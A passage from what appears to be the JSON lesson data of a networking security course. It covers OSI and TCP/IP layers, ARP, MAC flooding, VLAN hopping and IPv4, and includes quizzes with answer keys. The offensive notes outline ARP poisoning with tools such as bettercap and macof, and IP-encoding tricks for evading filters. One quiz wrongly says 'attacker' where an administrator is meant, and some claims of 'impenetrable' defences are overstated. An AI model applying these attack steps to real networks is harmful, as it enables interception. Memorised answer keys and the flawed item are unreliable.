          "options": [
            "Layer 2 - Data Link",
            "Layer 4 - Transport",
            "Layer 6 - Presentation",
            "Layer 3 - Network"
          ],
          "answer": 2,
          "explanation": "Layer 6 (Presentation) formats, translates, serializes, compresses, and encodes/decodes data so that applications on different systems can interpret it."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 20,
        "title": "Protocol Data Units (PDUs)",
        "summary": "Bits, Frames, Packets, Segments, and Data: the anatomy of data as it transitions between layers.",
        "concept": "Each layer packages data into a specific Protocol Data Unit (PDU):\n- Layer 1: Bits (0s and 1s transmitted as voltage, light, or RF pulses)\n- Layer 2: Frame (Ethernet frame with MAC header + payload + FCS trailer)\n- Layer 3: Packet / Datagram (IP packet with IP header + transport payload)\n- Layer 4: Segment (TCP segment) / Datagram (UDP datagram) with port header\n- Layer 5-7: Data / Message (Application payload, HTTP request/response).",
        "cyberLens": {
          "offensive": "Protocol header manipulation: Attackers forge specific PDU headers (e.g. setting custom TCP flags or fake source IP addresses) to bypass security filters.",
          "defensive": "Packet capture tools (Wireshark, tcpdump) decode PDUs layer-by-layer, allowing analysts to correlate lower-layer transport anomalies with upper-layer application exploits."
        },
        "keyPoints": [
          "Memorize PDU names: Bits -> Frames -> Packets -> Segments -> Data.",
          "Headers contain control metadata; trailers usually contain checksums (CRC).",
          "A packet is encapsulated inside a frame; a segment is encapsulated inside a packet."
        ],
        "quiz": {
          "question": "What is the correct PDU term for data encapsulated at the Network layer (Layer 3)?",
          "options": [
            "Frame",
            "Packet (or Datagram)",
            "Segment",
            "Bitstream"
          ],
          "answer": 1,
          "explanation": "At Layer 3 (Network Layer, e.g. IPv4/IPv6), the PDU is formally known as a Packet or Datagram."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 21,
        "title": "Encapsulation & Decapsulation",
        "summary": "How data is wrapped in headers going down the stack and unwrapped coming up.",
        "concept": "- Encapsulation (Sender): Application data is handed down the stack. Each layer prepends its own header (and L2 appends a trailer). Layer 7 Data -> L4 adds Port Header -> L3 adds IP Header -> L2 adds MAC Header and CRC -> L1 transmits Bits.\n- Decapsulation (Receiver): Incoming bits are received at L1. L2 checks CRC and strips MAC header -> L3 reads IP and strips IP header -> L4 checks Port and strips TCP header -> L7 application processes the raw data.",
        "cyberLens": {
          "offensive": "Tunneling / C2 Over Encapsulation: Malware encapsulates forbidden protocol traffic inside permitted protocols (e.g., DNS Tunneling, ICMP Tunneling, WebSocket C2) to evade firewalls.",
          "defensive": "Firewall Deep Packet Inspection (DPI) decapsulates nested protocols to expose hidden payloads and verify payload conformity."
        },
        "keyPoints": [
          "Encapsulation is like placing a letter inside multiple nested envelopes.",
          "Each layer header contains a protocol identifier field indicating what comes next (e.g. EtherType, IP Protocol field).",
          "Decapsulation occurs at the receiving host and at intermediate routers/switches."
        ],
        "quiz": {
          "question": "How does an Ethernet Frame header inform the operating system which Layer 3 protocol (IPv4, IPv6, or ARP) is encapsulated inside it?",
          "options": [
            "By scanning the entire payload with AI",
            "Through the 2-byte EtherType field (e.g., 0x0800 for IPv4, 0x0806 for ARP)",
            "Through the MAC address",
            "Ethernet frames cannot contain IPv6"
          ],
          "answer": 1,
          "explanation": "The EtherType field in the Ethernet II header explicitly identifies the encapsulated protocol: 0x0800 for IPv4, 0x86DD for IPv6, and 0x0806 for ARP."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 22,
        "title": "The Lower Layers: L1, L2, and L3",
        "summary": "From physical bits to local frame switching and global IP routing.",
        "concept": "- Layer 1 (Physical): Voltage levels, fiber wavelengths, RF frequencies, pinouts. Device: Repeater, Hub, Cable, Transceiver.\n- Layer 2 (Data Link): Framing, physical addressing (MAC), error detection (CRC), flow control, media access (CSMA/CD). Device: Switch, Bridge, NIC.\n- Layer 3 (Network): Logical addressing (IPv4/IPv6), path selection, routing between subnets, packet fragmentation, TTL management. Device: Router, Layer 3 Switch.",
        "cyberLens": {
          "offensive": "Layer 2 attacks bypass traditional firewalls because they occur inside the local broadcast domain (e.g., ARP poisoning, DHCP starvation).",
          "defensive": "Dynamic ARP Inspection (DAI), DHCP Snooping, and 802.1X Port Authentication secure Layer 2 before packets reach Layer 3 routing."
        },
        "keyPoints": [
          "L1 handles physical transmission of raw bits.",
          "L2 guarantees error-free frame delivery on the single local link.",
          "L3 enables packet delivery across disparate, heterogeneous networks worldwide."
        ],
        "quiz": {
          "question": "Which layer is responsible for determining the optimal path across multiple intermediate networks to reach a destination host on another continent?",
          "options": [
            "Layer 1 Physical",
            "Layer 2 Data Link",
            "Layer 3 Network",
            "Layer 5 Session"
          ],
          "answer": 2,
          "explanation": "Layer 3 (Network) handles global logical addressing and path determination (routing) across interconnected autonomous systems."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 23,
        "title": "The Upper Layers: L4, L5, L6, and L7",
        "summary": "End-to-end transport reliability, session continuity, syntax translation, and application logic.",
        "concept": "- Layer 4 (Transport): Process-to-process communication via Port numbers, connection management (TCP 3-way handshake), flow control, reliability.\n- Layer 5 (Session): Establishes, manages, and terminates dialogs between local and remote applications (RPC, NetBIOS, SIP).\n- Layer 6 (Presentation): Formatting, character serialization, compression (gzip), and cryptographic presentation.\n- Layer 7 (Application): Protocols directly interacting with software (HTTP/HTTPS, DNS, SMTP, FTP, SSH).",
        "cyberLens": {
          "offensive": "Layer 7 attacks (SQL Injection, Cross-Site Scripting, Deserialization) bypass network firewalls because the packet headers (IP and Port 443) are completely legitimate.",
          "defensive": "Web Application Firewalls (WAF) inspect Layer 7 HTTP payloads and decode encoded malicious characters before application execution."
        },
        "keyPoints": [
          "L4 multiplexes traffic to specific running processes using port numbers.",
          "L5-L7 are merged into the Application layer in the TCP/IP model.",
          "Modern exploits increasingly target Layer 7 because lower layers are well-standardized."
        ],
        "quiz": {
          "question": "Why do standard network firewalls operating at Layer 3/4 fail to detect an SQL injection attack in an HTTP POST request?",
          "options": [
            "SQL queries do not use electricity.",
            "Layer 3/4 firewalls only inspect IP addresses and port numbers, ignoring the application payload where the SQL query resides.",
            "SQL queries can only be detected by routers.",
            "HTTP cannot be blocked by any firewall."
          ],
          "answer": 1,
          "explanation": "Layer 3/4 firewalls only examine IP headers and TCP/UDP ports. Since port 443 (HTTPS) is permitted, the malicious SQL payload passes right through unless an L7 WAF inspects it."
        }
      },
      {
        "screenNumber": 6,
        "globalSource": 24,
        "title": "Mapping Attacks Across the 7 Layers",
        "summary": "A comprehensive cybersecurity matrix of attacks and defensive controls for each OSI layer.",
        "concept": "- L1: Cable tapping, RF jamming, physical port tampering -> Control: Physical access security, conduit piping, Faraday cages.\n- L2: ARP Poisoning, MAC flooding, VLAN hopping, STP manipulation -> Control: Port security, Dynamic ARP Inspection, DHCP Snooping, 802.1X.\n- L3: IP spoofing, ICMP floods, BGP hijacking -> Control: Ingress/egress ACLs, RPKI, Unicast Reverse Path Forwarding (uRPF).\n- L4: SYN flood DoS, TCP reset attacks, port scanning -> Control: SYN cookies, stateful inspection, rate limiting.\n- L5-L6: Session hijacking, SSL stripping, downgrade attacks -> Control: TLS 1.3, HSTS, Secure cookies.\n- L7: SQLi, XSS, CSRF, DNS tunneling, credential stuffing -> Control: WAF, input sanitization, mTLS, API gateways.",
        "cyberLens": {
          "offensive": "A skilled penetration tester chooses the lowest possible layer necessary to accomplish the objective with minimal logging.",
          "defensive": "Defense-in-depth requires active security controls deployed at every single layer of the stack."
        },
        "keyPoints": [
          "Security is not a single point; vulnerabilities exist at every OSI tier.",
          "If a lower layer is compromised, all layers above it are implicitly untrusted.",
          "Mastering layer mapping allows you to pass CompTIA Security+, CEH, and CISSP exams."
        ],
        "quiz": {
          "question": "If an attacker succeeds in executing an ARP Poisoning attack at Layer 2, what happens to the security of all upper layers (L3-L7) transmitting unencrypted data?",
          "options": [
            "Upper layers are completely unaffected because they are higher up.",
            "All unencrypted upper-layer traffic is intercepted, read, and modified by the attacker.",
            "The router automatically disables Layer 2.",
            "The attacker is blocked by the DNS server."
          ],
          "answer": 1,
          "explanation": "Networking is hierarchical: if the underlying Layer 2 foundation is compromised, the attacker becomes the Man-in-the-Middle and controls all packets flowing through it."
        }
      }
    ]
  },
  {
    "id": "06",
    "module": "02 / MODELS AND THE LOCAL LINK",
    "title": "The TCP/IP model",
    "desc": "Map the teaching model onto the protocol suite used on real networks.",
    "screensCount": 5,
    "sourceRange": "SOURCE 25-29",
    "simulator": "model-comparator",
    "badge": "Real-World Standard",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 25,
        "title": "The DoD Model: The Architecture of the Internet",
        "summary": "Why the pragmatic 4-layer TCP/IP model won the protocol wars against the 7-layer OSI model.",
        "concept": "Developed by the Department of Defense (DARPA) in the 1970s, the TCP/IP suite was designed for survivable, decentralized packet networks. Instead of 7 theoretical layers, TCP/IP consolidates functionality into 4 pragmatic layers:\n1. Network Access / Link Layer (OSI L1 + L2): Ethernet, Wi-Fi, ARP, physical transmission.\n2. Internet Layer (OSI L3): IPv4, IPv6, ICMP, IGMP. Handles routing across networks.\n3. Transport Layer (OSI L4): TCP, UDP. End-to-end communication and port multiplexing.\n4. Application Layer (OSI L5 + L6 + L7): HTTP, DNS, SSH, TLS, SMTP, FTP.",
        "cyberLens": {
          "offensive": "The early TCP/IP architecture was built on academic trust without built-in authentication or encryption. Cyber attackers exploit these foundational design flaws (IP spoofing, unauthenticated ARP, cleartext protocols).",
          "defensive": "Modern protocols wrap security extensions around legacy TCP/IP foundations (e.g. IPsec for Internet layer, TLS for Transport/Application, DNSSEC for DNS)."
        },
        "keyPoints": [
          "OSI was designed by committee; TCP/IP was designed by working code (RFCs).",
          "TCP/IP collapsed Presentation and Session into the Application layer.",
          "Every host connected to the Internet runs an implementation of the TCP/IP stack in its kernel."
        ],
        "quiz": {
          "question": "Which layers of the 7-layer OSI model are combined into the Application Layer of the TCP/IP model?",
          "options": [
            "Network and Transport",
            "Application, Presentation, and Session",
            "Data Link and Physical",
            "Transport and Session"
          ],
          "answer": 1,
          "explanation": "The TCP/IP model combines OSI Layers 5 (Session), 6 (Presentation), and 7 (Application) into a single unified Application layer."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 26,
        "title": "The Core Protocol Suite Breakdown",
        "summary": "Examining the key protocols that make up each tier of the TCP/IP architecture.",
        "concept": "- Application: HTTP/HTTPS (Web), DNS (Name resolution), SSH (Secure management), SMTP/IMAP (Email), DHCP (Configuration).\n- Transport: TCP (Reliable, stateful, ordered), UDP (Unreliable, fast, stateless).\n- Internet: IP (Packet addressing and routing), ICMP (Diagnostic and error reporting), ARP (L3 to L2 address mapping).\n- Link: Ethernet (IEEE 802.3), Wi-Fi (IEEE 802.11), PPP.",
        "cyberLens": {
          "offensive": "Protocol Abuse: Attackers use ICMP for covert exfiltration (ICMP tunneling), ARP for traffic redirection, and UDP for reflected amplification DDoS.",
          "defensive": "Protocol whitelisting: Blocking unnecessary protocols at perimeter firewalls (e.g. dropping inbound ICMP Echo Request or disabling NetBIOS/SMB across WAN edges)."
        },
        "keyPoints": [
          "IP is the central hourglass waist of the internet: everything runs over IP, and IP runs over everything.",
          "TCP provides reliable byte streams; UDP provides lightweight datagrams.",
          "Diagnostics rely on companion protocols like ICMP and ARP."
        ],
        "quiz": {
          "question": "Why is the IP protocol often referred to as the 'waist of the hourglass' in the Internet protocol architecture?",
          "options": [
            "Because IP packets can only be 100 bytes long.",
            "Because diverse applications above and diverse physical media below all converge on IP as the single universal routing standard.",
            "Because IP was invented in the middle of the 20th century.",
            "Because IP slows down fast network traffic."
          ],
          "answer": 1,
          "explanation": "Dozens of application protocols (HTTP, SSH, DNS, etc.) sit at the top, and diverse physical links (Ethernet, Wi-Fi, 5G, fiber) sit at the bottom. They all converge through the single common protocol: IP."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 27,
        "title": "OSI vs TCP/IP: Direct Head-to-Head Comparison",
        "summary": "Comparing boundaries, terminology, and practical packet parsing.",
        "concept": "While OSI strictly separates concepts from implementations, TCP/IP merges functional layers:\n- OSI Layer 5/6/7 vs TCP/IP Layer 4 (Application): In TCP/IP, the application developer implements data formatting, encryption (TLS), and session tokens in userspace software, rather than relying on OS kernel layers.\n- OSI Layer 1/2 vs TCP/IP Layer 1 (Link): TCP/IP treats the local network driver and physical wire as an integrated hardware link layer handled by the Network Interface Card (NIC).",
        "cyberLens": {
          "offensive": "User-space vulnerability exploitation: Because TLS and session management reside in user-space application code, memory corruption bugs like OpenSSL Heartbleed expose private keys without touching the kernel network stack.",
          "defensive": "Kernel-level firewalls (iptables, eBPF, Windows Filtering Platform) hook packets at the TCP/IP stack layers for maximum performance."
        },
        "keyPoints": [
          "OSI is best for structured conceptual learning and troubleshooting.",
          "TCP/IP is what software developers, socket APIs, and network operating systems actually run.",
          "In Wireshark, dissecting a packet shows both OSI layer names and TCP/IP protocol headers."
        ],
        "quiz": {
          "question": "Where does TLS/SSL encryption occur in the TCP/IP model compared to the OSI model?",
          "options": [
            "In TCP/IP it operates in the Application/Transport boundary; in OSI it sits primarily at the Presentation layer (Layer 6).",
            "In both models it sits at Layer 1 Physical.",
            "TLS operates only at Layer 2 Data Link.",
            "TLS is not part of either model."
          ],
          "answer": 0,
          "explanation": "In OSI, encryption is a classic Layer 6 (Presentation) function. In TCP/IP, TLS is implemented as an application-level security library sitting directly on top of Transport Layer TCP."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 28,
        "title": "The Socket API & The Transport-Application Boundary",
        "summary": "How applications talk to the operating system's networking kernel: Sockets, file descriptors, and system calls.",
        "concept": "In modern operating systems (Linux, Windows, macOS), the network stack lives inside the OS Kernel. User-space programs (browsers, web servers, malware) communicate with the kernel stack via the Berkeley Sockets API:\n- `socket()`: Creates an endpoint for communication (returns a file descriptor).\n- `bind()`: Associates the socket with a local IP and Port.\n- `listen()`: Puts a TCP socket into passive listening mode.\n- `accept()`: Accepts an incoming connection request.\n- `connect()`: Initiates a 3-way handshake to a remote host.\n- `send()` / `recv()`: Writes and reads data bytes over the network.",
        "cyberLens": {
          "offensive": "Raw Sockets: Elevated root/admin processes can create `SOCK_RAW` sockets to bypass OS TCP/IP formatting, forging arbitrary packet headers for stealth scans (SYN scans) or IP spoofing.",
          "defensive": "Restricting raw socket creation privileges prevents unprivileged users from crafting spoofed network packets or sniffing raw interfaces."
        },
        "keyPoints": [
          "A network socket is an abstraction: an IP address + Port number + Protocol.",
          "Standard sockets let the kernel handle TCP handshakes and retransmissions.",
          "Raw sockets allow manual bit-level control over every header field."
        ],
        "quiz": {
          "question": "Why does a port scanner like Nmap require root or administrator privileges to perform a SYN stealth scan (-sS)?",
          "options": [
            "Because non-admin users cannot access the keyboard.",
            "Because crafting custom raw TCP SYN packets without letting the OS automatically complete the 3-way handshake requires raw socket (SOCK_RAW) privileges.",
            "Because administrator privileges make internet connections faster.",
            "Because Windows blocks all scanning."
          ],
          "answer": 1,
          "explanation": "Standard OS socket APIs automatically complete the handshake by sending an ACK or RST. To send a raw SYN and sniff the reply without the OS interfering, Nmap must use raw sockets requiring root/admin rights."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 29,
        "title": "Packet Life Cycle: From User Click to Wire",
        "summary": "Tracing a complete HTTP request from application memory down to physical photons/electrons.",
        "concept": "1. User types `https://example.com` into browser.\n2. Browser issues a DNS query system call to resolve IP.\n3. Browser creates TCP socket and calls `connect(93.184.216.34:443)`.\n4. Kernel builds TCP SYN segment (L4), wraps it in IP packet (L3).\n5. Kernel looks up ARP cache for Gateway MAC, wraps in Ethernet Frame (L2).\n6. NIC serializes frame into electrical voltages or optical laser pulses (L1).\n7. Packets traverse switches, routers, and undersea fiber cables.\n8. Server receives, decapsulates, completes handshake, and returns web page.",
        "cyberLens": {
          "offensive": "An attacker can intercept or hijack traffic at any step: DNS spoofing (Step 2), TCP SYN hijacking (Step 4), ARP poisoning (Step 5), or physical tap (Step 6).",
          "defensive": "End-to-end encryption (TLS 1.3) protects the payload data even if intermediate nodes at Steps 5-7 are untrusted or compromised."
        },
        "keyPoints": [
          "Networking is an orchestrated symphony of multiple protocols working in microseconds.",
          "Understanding the exact sequence is critical for isolating latency and network failures.",
          "Security controls must protect every stage of the lifecycle."
        ],
        "quiz": {
          "question": "Before your computer can send an IP packet to a remote web server on the Internet, what Layer 2 destination address must it put on the Ethernet frame?",
          "options": [
            "The web server's MAC address",
            "The local Default Gateway (router) MAC address",
            "FF:FF:FF:FF:FF:FF",
            "00:00:00:00:00:00"
          ],
          "answer": 1,
          "explanation": "Ethernet frames can only travel within the local subnet. To reach the Internet, the host places the remote server's IP in the L3 packet, but addresses the L2 frame to the MAC address of its local default gateway router."
        }
      }
    ]
  },
  {
    "id": "07",
    "module": "02 / MODELS AND THE LOCAL LINK",
    "title": "L1 & L2: the local wire",
    "desc": "Explore MAC addresses, Ethernet frames, ARP, and local network attacks.",
    "screensCount": 7,
    "sourceRange": "SOURCE 30-36",
    "simulator": "arp-poisoning-sim",
    "badge": "Local Wire Security",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 30,
        "title": "MAC Addresses: Hardware Identity",
        "summary": "48 bits, Organizationally Unique Identifier (OUI), and why physical addresses are easily spoofed.",
        "concept": "A Media Access Control (MAC) address is a 48-bit (6-byte) hexadecimal identifier burned into a Network Interface Card (NIC), e.g., 00:1A:2B:3C:4D:5E:\n- First 24 bits (3 bytes): Organizationally Unique Identifier (OUI) assigned by IEEE to the manufacturer (e.g., Apple, Intel, Cisco).\n- Last 24 bits (3 bytes): Network Interface Controller specific serial assigned by the vendor.\n- MAC addresses operate strictly within the local Layer 2 broadcast domain.",
        "cyberLens": {
          "offensive": "MAC Spoofing: Attackers spoof legitimate device MACs (such as an approved corporate laptop or VoIP phone) to bypass 802.1X Network Access Control (NAC) or captive portal authentication filters.",
          "defensive": "Enterprise 802.1X uses certificate-based EAP-TLS authentication rather than trusting raw MAC addresses."
        },
        "keyPoints": [
          "MAC addresses are physically etched on NICs, but operating systems can overwrite them in RAM at will.",
          "OUIs reveal the vendor and hardware type during passive network reconnaissance.",
          "MAC address filtering is not a security boundary; it is merely a minor speed bump."
        ],
        "quiz": {
          "question": "What part of a 48-bit MAC address identifies the manufacturer of the network hardware?",
          "options": [
            "The last 24 bits",
            "The first 24 bits (Organizationally Unique Identifier / OUI)",
            "The default gateway IP",
            "The CRC checksum"
          ],
          "answer": 1,
          "explanation": "The first 3 bytes (24 bits) are the OUI allocated by the IEEE to identify the specific hardware manufacturer."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 31,
        "title": "The Ethernet II Frame Anatomy",
        "summary": "Preamble, SFD, Destination MAC, Source MAC, EtherType, Payload, and FCS.",
        "concept": "The standard Ethernet II frame consists of:\n1. Preamble (7 bytes) & Start Frame Delimiter (1 byte): Synchronizes receiver clock.\n2. Destination MAC (6 bytes): Where the frame goes on the local link.\n3. Source MAC (6 bytes): Who sent the frame.\n4. EtherType (2 bytes): Identifies upper-layer protocol (0x0800 = IPv4, 0x86DD = IPv6, 0x0806 = ARP).\n5. Payload (46 to 1500 bytes): The MTU containing the L3 IP packet.\n6. Frame Check Sequence (FCS) / CRC32 (4 bytes): Mathematical integrity verification.",
        "cyberLens": {
          "offensive": "Frame Padding Leakage: If an Ethernet payload is smaller than 46 bytes, the OS pads it. Vulnerable legacy operating systems padded with uninitialized kernel RAM, leaking memory contents onto the wire.",
          "defensive": "Switches drop frames with FCS CRC errors before forwarding them, preventing corrupted packets from wasting bandwidth."
        },
        "keyPoints": [
          "Minimum Ethernet frame size is 64 bytes (including 14B header + 46B payload + 4B FCS).",
          "Standard Maximum Transmission Unit (MTU) is 1500 bytes.",
          "EtherType lets the OS multiplex multiple L3 protocols across the same physical NIC."
        ],
        "quiz": {
          "question": "What is the standard maximum payload size (MTU) for a default Ethernet II frame without Jumbo Frames enabled?",
          "options": [
            "64 bytes",
            "1500 bytes",
            "9000 bytes",
            "65535 bytes"
          ],
          "answer": 1,
          "explanation": "Standard Ethernet has an MTU of 1500 bytes. Datagrams exceeding 1500 bytes must be fragmented at Layer 3 or use Jumbo Frames (up to 9000 bytes) in data centers."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 32,
        "title": "Address Resolution Protocol (ARP) Deep Dive",
        "summary": "Mapping Layer 3 IP addresses to Layer 2 MAC addresses on the local wire.",
        "concept": "Computers communicate using IP addresses, but physical network switches only understand MAC addresses. ARP bridges this gap:\n1. ARP Request: 'Who has 192.168.1.1? Tell 192.168.1.50' sent as a Layer 2 Broadcast (FF:FF:FF:FF:FF:FF).\n2. Every host on the subnet receives the broadcast.\n3. The host owning 192.168.1.1 responds with an ARP Reply: '192.168.1.1 is at 00:0c:29:ab:cd:ef' sent as a Layer 2 Unicast.\n4. Both hosts cache the mapping in their local ARP Table (viewable with `arp -a`).",
        "cyberLens": {
          "offensive": "Gratuitous ARP: Devices can broadcast an unsolicited ARP reply to announce their MAC. Attackers abuse gratuitous ARPs to inject fake entries into victims' caches without any prior request.",
          "defensive": "Dynamic ARP Inspection (DAI) on managed switches inspects ARP packets against a trusted DHCP Snooping binding database, dropping forged ARP replies."
        },
        "keyPoints": [
          "ARP operates between Layer 2 and Layer 3.",
          "ARP requests are broadcast; ARP replies are unicast.",
          "ARP has NO authentication; devices trust whatever reply arrives last."
        ],
        "quiz": {
          "question": "Why is an ARP Request sent as a broadcast frame (FF:FF:FF:FF:FF:FF)?",
          "options": [
            "Because the sender does not yet know the destination MAC address.",
            "Because the router requires all packets to be broadcasts.",
            "Because ARP is an encrypted protocol.",
            "Because Wi-Fi does not support unicast."
          ],
          "answer": 0,
          "explanation": "The entire reason for sending an ARP request is that the sender only knows the IP address and needs to discover the corresponding MAC address. Therefore, it must broadcast to all nodes."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 33,
        "title": "ARP Cache Poisoning & Man-in-the-Middle (MITM)",
        "summary": "The devastating vulnerability at the heart of local area networks.",
        "concept": "Because ARP is stateless and unauthenticated, a device accepts any ARP reply even if it never sent an ARP request:\n1. Attacker sends forged ARP reply to Victim: 'Gateway 192.168.1.1 is at Attacker MAC'.\n2. Attacker sends forged ARP reply to Gateway: 'Victim 192.168.1.50 is at Attacker MAC'.\n3. Victim's traffic to Internet flows through Attacker.\n4. Gateway's traffic to Victim flows through Attacker.\n5. Attacker enables IP forwarding (`sysctl -w net.ipv4.ip_forward=1`), inspects/modifies packets, and forwards them unnoticed.",
        "cyberLens": {
          "offensive": "Tools like `arpspoof`, `bettercap`, and `Ettercap` automate bidirectional ARP poisoning in seconds, enabling credential sniffing, session hijacking, and DNS redirection.",
          "defensive": "Enable Dynamic ARP Inspection (DAI) and DHCP Snooping on all access switch ports. Configure static ARP entries for critical servers."
        },
        "keyPoints": [
          "ARP poisoning turns a switched network into an eavesdropper's hub.",
          "Victims show duplicate MAC addresses for both the router and the attacker in `arp -a`.",
          "Combined with SSL stripping, ARP poisoning can downgrade HTTPS to cleartext HTTP."
        ],
        "quiz": {
          "question": "What command-line observation on a victim machine strongly indicates an ongoing ARP poisoning attack?",
          "options": [
            "The CPU usage drops to 0%.",
            "Running `arp -a` reveals that two different IP addresses (e.g. Default Gateway and a workstation) share the exact same MAC address.",
            "The DNS server address changes to 127.0.0.1.",
            "The ping command returns 'host unreachable'."
          ],
          "answer": 1,
          "explanation": "When an attacker poisons the ARP cache, both the default gateway IP and the attacker's own IP will map to the attacker's single physical MAC address."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 34,
        "title": "MAC Flooding & CAM Table Exhaustion",
        "summary": "Forcing intelligent switches into 'fail-open' broadcast mode.",
        "concept": "Switch Content Addressable Memory (CAM) tables have finite capacity (typically 8,000 to 128,000 entries):\n1. Attacker runs `macof` to generate tens of thousands of fake Ethernet frames with random source MACs every second.\n2. The CAM table fills to capacity within seconds.\n3. When new legitimate frames arrive, the switch has no memory space to learn their ports or find destinations.\n4. Fail-Open Behavior: The switch reverts to hub-like behavior, flooding all incoming unicast traffic out every port, allowing the attacker to passively sniff all conversations on the switch.",
        "cyberLens": {
          "offensive": "CAM exhaustion disables the microsegmentation benefit of switches without needing to target specific host IPs.",
          "defensive": "Cisco Port Security: Limit MAC count per port (e.g. `switchport port-security maximum 2`) with violation mode set to `restrict` or `shutdown`."
        },
        "keyPoints": [
          "CAM table maps MAC -> Port.",
          "Overflow causes unknown unicast flooding.",
          "Port security shuts down the port when an anomaly is detected."
        ],
        "quiz": {
          "question": "Which switch security feature is specifically designed to neutralize MAC flooding attacks?",
          "options": [
            "Spanning Tree Protocol (STP)",
            "Port Security with MAC address limits",
            "Jumbo Frame enablement",
            "VLAN Trunking Protocol (VTP)"
          ],
          "answer": 1,
          "explanation": "Port Security enforces a strict limit on how many MAC addresses can be learned on a single physical switch port, disabling the port if thousands of random MACs arrive."
        }
      },
      {
        "screenNumber": 6,
        "globalSource": 35,
        "title": "VLANs & VLAN Hopping Attacks",
        "summary": "Logical subnetting at Layer 2 with 802.1Q tags and trunk encapsulation exploitation.",
        "concept": "Virtual Local Area Networks (VLANs) logically segment a physical switch into multiple isolated broadcast domains:\n- Access Ports: Carry untagged frames belonging to one specific VLAN.\n- Trunk Ports: Carry frames for multiple VLANs using IEEE 802.1Q tags (inserting a 4-byte tag with a 12-bit VLAN ID, supporting up to 4094 VLANs).\nVLAN Hopping Exploits:\n1. Switch Spoofing: Attacker configures host NIC to negotiate DTP (Dynamic Trunking Protocol) as a trunk, gaining access to all VLANs.\n2. Double Tagging: Attacker sends frame with two 802.1Q tags. First switch strips native VLAN tag; second switch sees internal tag and forwards to victim VLAN (unidirectional).",
        "cyberLens": {
          "offensive": "VLAN hopping allows an attacker in an untrusted Guest Wi-Fi VLAN to jump into a protected Management or Payment Card (PCI-DSS) VLAN.",
          "defensive": "Disable DTP on all user ports (`switchport nonegotiate`), set all user ports to `mode access`, and assign an unused non-default Native VLAN."
        },
        "keyPoints": [
          "VLAN 1 is the default native VLAN on Cisco switches and must never be used for user data.",
          "Double tagging only works if the attacker belongs to the native VLAN of the trunk link.",
          "Trunk links must only connect switch-to-switch or switch-to-router."
        ],
        "quiz": {
          "question": "How does an attacker prevent switch spoofing on user-facing switch ports?",
          "options": [
            "Set the port mode explicitly to access and disable Dynamic Trunking Protocol (DTP).",
            "Increase the cable length.",
            "Use fiber instead of copper.",
            "Disable IPv6."
          ],
          "answer": 0,
          "explanation": "By explicitly configuring `switchport mode access` and `switchport nonegotiate`, the switch will reject any attempt by an attacker to negotiate an 802.1Q trunk link."
        }
      },
      {
        "screenNumber": 7,
        "globalSource": 36,
        "title": "Layer 2 Hardening: The Defensive Blueprint",
        "summary": "Integrating Port Security, DHCP Snooping, DAI, and 802.1X into an impenetrable Layer 2 defense.",
        "concept": "To completely eliminate local link attacks, modern enterprise switches employ a synchronized 4-pillar defense:\n1. 802.1X Network Access Control (NAC): No device gets network access without authenticating via RADIUS.\n2. DHCP Snooping: Distinguishes trusted uplink ports from untrusted user ports, preventing rogue DHCP servers and building an IP-MAC-Port binding database.\n3. Dynamic ARP Inspection (DAI): Uses the DHCP Snooping database to validate every ARP frame; forged ARPs are dropped instantly.\n4. IP Source Guard (IPSG): Drops any IP packet whose source IP does not match the learned DHCP Snooping binding table.",
        "cyberLens": {
          "offensive": "Red teams running initial drop boxes or plugging into office wall jacks are immediately neutralized if 802.1X and DAI are active.",
          "defensive": "This four-layer defense (802.1X + Snooping + DAI + IPSG) shuts down ARP poisoning, MAC flooding, rogue DHCP servers, and IP spoofing permanently."
        },
        "keyPoints": [
          "Layer 2 defenses must be deployed together; DAI requires DHCP Snooping to function.",
          "Never leave unused switch ports active; administratively shut them down and place in a dead VLAN.",
          "Real-world cyber defense starts at the physical switch port."
        ],
        "quiz": {
          "question": "Which security feature provides the database of valid IP-to-MAC bindings required for Dynamic ARP Inspection (DAI) to work?",
          "options": [
            "DHCP Snooping",
            "Spanning Tree Protocol",
            "DNS Forwarder",
            "BGP"
          ],
          "answer": 0,
          "explanation": "DAI inspects ARP packets against the DHCP Snooping binding database. Without DHCP Snooping enabled, DAI does not know which IP legitimately belongs to which MAC."
        }
      }
    ]
  },
  {
    "id": "08",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L3: IP addressing",
    "desc": "Build an IPv4 address from bits and recognise public, private, and special ranges.",
    "screensCount": 5,
    "sourceRange": "SOURCE 37-41",
    "simulator": "ip-binary-converter",
    "badge": "Logical Addressing",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 37,
        "title": "IPv4 Structure & The Binary Reality",
        "summary": "32 bits, 4 octets, positional notation, and converting between binary and dotted-decimal.",
        "concept": "An IPv4 address is a 32-bit binary number divided into four 8-bit groups called octets:\n`11000000 . 10101000 . 00000001 . 00000001` -> `192.168.1.1`\nEach octet has 8 bit positions with decimal values: 128, 64, 32, 16, 8, 4, 2, 1.\nTotal IPv4 address space is 2^32 = 4,294,967,296 addresses.",
        "cyberLens": {
          "offensive": "IP Obfuscation: Web browsers and command-line tools can parse IPv4 addresses formatted as pure integers (`http://2130706433` = `127.0.0.1`), hex (`0x7f000001`), or octal (`0177.0.0.1`) to bypass naive regex security filters.",
          "defensive": "Security filters and SIEM rules must normalize alternative IP representations into standard canonical dotted-decimal format before evaluation."
        },
        "keyPoints": [
          "Computers process IP addresses purely as 32-bit unsigned integers.",
          "Dotted-decimal notation is strictly for human readability.",
          "Understanding binary bit values is essential for subnetting."
        ],
        "quiz": {
          "question": "What is the decimal equivalent of the binary octet 11001000?",
          "options": [
            "192",
            "200",
            "216",
            "224"
          ],
          "answer": 1,
          "explanation": "Bit weights: 128(1) + 64(1) + 32(0) + 16(0) + 8(1) + 4(0) + 2(0) + 1(0) = 128 + 64 + 8 = 200."
        }
      },
      {
        "screenNumber": 2,
